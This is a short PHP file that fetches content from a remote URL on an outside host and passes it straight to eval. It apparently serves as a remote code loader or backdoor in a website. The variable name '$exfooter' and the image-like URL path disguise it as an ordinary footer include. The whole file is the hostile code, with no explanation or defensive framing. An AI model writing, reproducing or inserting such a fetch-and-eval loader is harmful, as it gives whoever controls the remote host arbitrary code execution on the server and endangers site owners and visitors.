<?php
$url = 'https://gorod214.by/img/r/839ea7';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);